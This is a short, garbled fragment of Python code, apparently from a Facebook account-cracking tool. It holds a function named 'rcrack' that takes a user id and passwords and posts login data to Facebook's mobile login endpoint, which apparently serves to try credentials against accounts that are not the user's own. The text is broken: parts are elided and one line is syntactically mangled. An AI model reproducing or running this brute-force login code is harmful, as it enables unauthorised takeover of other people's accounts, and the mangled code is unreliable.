...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',: pro}
            lo = session.post(    'https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8&rtime=1695045800&hrc=1&wtsid=rdr_0OOdikIxkyHhe6cGq&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
